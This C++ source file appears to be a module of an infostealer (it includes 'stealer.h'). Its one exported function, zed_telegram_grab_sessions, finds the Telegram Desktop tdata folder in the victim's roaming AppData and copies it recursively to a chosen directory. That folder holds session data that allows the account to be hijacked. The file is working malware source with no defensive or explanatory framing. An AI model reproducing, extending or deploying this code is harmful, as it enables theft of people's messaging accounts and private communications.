#include "stealer.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <filesystem>
#include <fstream>
#include <cstring>

namespace fs = std::filesystem;

static std::string get_appdata_roaming() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
    return std::string(path);
}

extern "C" {

int zed_telegram_grab_sessions(const char* dest_dir) {
    std::string roaming = get_appdata_roaming();
    std::string tdata   = roaming + "\\Telegram Desktop\\tdata";

    if (!fs::exists(tdata)) return 0;

    try {
        fs::path dest = dest_dir;
        fs::create_directories(dest);
        fs::copy(tdata, dest / "tdata",
                 fs::copy_options::recursive | fs::copy_options::overwrite_existing);
        return 1;
    } catch (...) {
        return 0;
    }
}

} // extern "C"
